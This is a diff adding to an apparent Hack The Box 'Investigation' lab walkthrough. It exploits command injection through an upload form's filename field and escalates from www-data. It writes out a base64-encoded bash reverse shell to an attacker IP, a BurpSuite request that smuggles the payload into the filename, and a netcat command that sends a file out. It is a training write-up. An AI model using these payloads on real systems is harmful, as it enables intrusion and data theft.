@@ -1,4 +1,4 @@
-# Hack The Box - SwagShop Walkthrough w/o Metasploit
+# Hack The Box - Investigation Walkthrough
 
 ## Reconnaissance
 Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
@@ -82,5 +82,91 @@ In a nutshell, if the attacker provides a file with a name ending with | charact
 
 So, I decided to start `BurpSuite` to intercept the packet, and changed the `filename` parameter to a `ping` command to verify the vulnerability/
 
+![image](https://user-images.githubusercontent.com/87711310/225663455-a48458b1-4d5f-452c-bd35-c67c75643492.png)
 
+To obtain the reverse shell, I need to replace the `ping` command with the `reverse-shell` payload in the `filename` parameter. It turned out that the machine escaped some characters like `/`. So, I decided to `Base64` encode the script:
 
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
+└─$ echo 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==
+```
+
+And change the filename through `BurpSuite`:
+
+```
+# BurpSuite
+POST /upload.php HTTP/1.1
+Host: eforenzics.htb
+...
+...
+-----------------------------322887901231410547541681300375
+Content-Disposition: form-data; name="image"; filename="echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg=='|base64 -d|bash|"
+Content-Type: image/jpeg
+
+<DATA>
+```
+
+I clicked send, and I got the shell instantly
+
+![image](https://user-images.githubusercontent.com/87711310/225668776-cbb21aad-d090-494d-ad28-364838666f49.png)
+
+I was logged in as `www-data`, enumerating the machine I found out that I did not have the permission to view the `smorton` folder. So, I had to escalate my privileges
+
+```
+www-data@investigation:~$ cd /home
+cd /homel
+www-data@investigation:/home$ s
+ls
+smorton
+www-data@investigation:/home$ cd smorton
+cd smorton
+bash: cd: smorton: Permission denied
+www-data@investigation:/home$ 
+```
+
+I was stuck at this part for a while but after looking at all the folder for a possible way to escalate the privileges, I found out that there was a `investigation` folder inside the `/usr/local` folder.
+
+```
+www-data@investigation:/$ cd /usr
+cd /usr
+www-data@investigation:/usr$ cd /local
+cd /local
+www-data@investigation:/usr$ cd local
+cd local
+www-data@investigation:/usr/local$ ls
+ls
+bin
+etc
+games
+include
+investigation
+lib
+man
+sbin
+share
+src
+```
+
+The files in the directories were:
+
+```
+www-data@investigation:/usr/local/investigation$ ls -la *
+ls -la *
+-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1 00:35 Windows Event Logs for Analysis.msg
+-rw-rw-r-- 1 www-data www-data       0 Oct  1 00:40 analysed_log
+```
+
+The `Windows Event Logs for Analysis.msg` was a Microsoft Outlook Message, meaning I had to transfer it to my machine and look to convert the message.
+
+```
+www-data@investigation:/usr/local/investigation$ file "Windows Event Logs for Analysis.msg"
+<igation$ file "Windows Event Logs for Analysis.msg"
+Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
+```
+
+So, I used `netcat` to transfer the file from the victim machine to my machine.
+
+```
+nc  10.10.14.8 10000 < Windows\ Event\ Logs\ for\ Analysis.msg 
+```
